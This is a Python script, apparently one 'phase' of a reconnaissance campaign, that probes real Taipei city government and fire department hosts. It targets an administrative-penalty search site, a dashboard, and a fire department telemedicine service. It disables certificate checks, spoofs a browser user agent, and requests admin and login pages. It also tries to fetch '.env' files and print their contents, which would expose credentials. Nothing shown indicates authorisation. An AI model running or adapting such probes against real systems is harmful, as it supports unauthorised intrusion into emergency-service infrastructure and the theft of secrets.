#!/usr/bin/env python3
"""Phase 8: Deep probe of specific login endpoints found."""
import requests, urllib3, re, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/json,*/*",
})

results = {}

# 1. www.af-search.119.gov.taipei - admin login redirect
print("=" * 60)
print("1. www.af-search.119.gov.taipei - 行政罰查網")
print("=" * 60)
for path in ["/", "/admin/login", "/login", "/.env", "/robots.txt"]:
    url = f"https://www.af-search.119.gov.taipei{path}"
    try:
        r = s.get(url, timeout=10, verify=False, allow_redirects=False)
        # Follow redirect if any
        if r.status_code in [301, 302, 307, 308]:
            loc = r.headers.get("Location", "")
            r2 = s.get(f"https://www.af-search.119.gov.taipei{loc}" if loc.startswith("/") else loc,
                       timeout=10, verify=False, allow_redirects=False)
            print(f"  [{r.status_code}->{r2.status_code}] {path} -> {loc} ({r2.text[:200]})")
        else:
            print(f"  [{r.status_code}] {path} ({len(r.text)}b)")
            if r.text:
                title = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I)
                print(f"    Title: {title.group(1)[:80] if title else 'N/A'}")
                print(f"    Body: {r.text[:300]}")
    except Exception as e:
        print(f"  [ERR] {path}: {e}")
    print()

# 2. fsm.119.gov.taipei - .env file + app
print("=" * 60)
print("2. fsm.119.gov.taipei - FSM system")
print("=" * 60)
for path in ["/.env", "/w/fsm119/index", "/w/fsm119/", "/w/fsm119/login",
             "/w/fsm119/Login", "/w/fsm119/admin", "/w/fsm119/api/login"]:
    url = f"https://fsm.119.gov.taipei{path}"
    try:
        r = s.get(url, timeout=10, verify=False, allow_redirects=False)
        print(f"  [{r.status_code}] {path} ({len(r.text)}b)")
        if r.text and len(r.text) > 0:
            # Check for env vars in .env
            if path == "/.env":
                print(f"    *** .env CONTENT ***")
                print(f"    {r.text[:500]}")
            else:
                title = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I)
                print(f"    Title: {title.group(1)[:80] if title else 'N/A'}")
                print(f"    Body: {r.text[:300]}")
    except Exception as e:
        print(f"  [ERR] {path}: {e}")
    print()

# 3. taipeiciiis-dashboard.119.gov.taipei - 403 admin panel
print("=" * 60)
print("3. taipeiciiis-dashboard.119.gov.taipei - dashboard")
print("=" * 60)
for path in ["/", "/login", "/admin", "/api", "/auth/login",
             "/.env", "/robots.txt", "/index.html"]:
    url = f"https://taipeiciiis-dashboard.119.gov.taipei{path}"
    try:
        r = s.get(url, timeout=10, verify=False, allow_redirects=False)
        print(f"  [{r.status_code}] {path} ({len(r.text)}b) [{r.headers.get('Server','')[:30]}]")
        if r.text and r.status_code != 403:
            title = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I)
            print(f"    Title: {title.group(1)[:80] if title else 'N/A'}")
            print(f"    Body: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {path}: {e}")
    print()

# 4. service119.119.gov.taipei - nginx default
print("=" * 60)
print("4. service119.119.gov.taipei - nginx")
print("=" * 60)
for path in ["/", "/index.html", "/login", "/admin", "/api", "/auth"]:
    url = f"https://service119.119.gov.taipei{path}"
    try:
        r = s.get(url, timeout=10, verify=False, allow_redirects=False)
        print(f"  [{r.status_code}] {path} ({len(r.text)}b)")
        if r.text:
            print(f"    Body: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {path}: {e}")
    print()

# 5. tpertc.tfd.gov.tw - RTC login
print("=" * 60)
print("5. tpertc.tfd.gov.tw - RTC telemedicine")
print("=" * 60)
for path in ["/rtc/account.php", "/rtc/", "/account.php",
             "/login", "/admin", "/index.php",
             "/rtc/account.php/login", "/api/login"]:
    url = f"https://tpertc.tfd.gov.tw{path}"
    try:
        r = s.get(url, timeout=10, verify=False, allow_redirects=False)
        print(f"  [{r.status_code}] {path} ({len(r.text)}b) [{r.headers.get('Server','')[:30]}]")
        if r.text and len(r.text) > 10:
            print(f"    Body: {r.text[:300]}")
    except Exception as e:
        print(f"  [ERR] {path}: {e}")
    print()

print("\n[*] Deep probe complete")
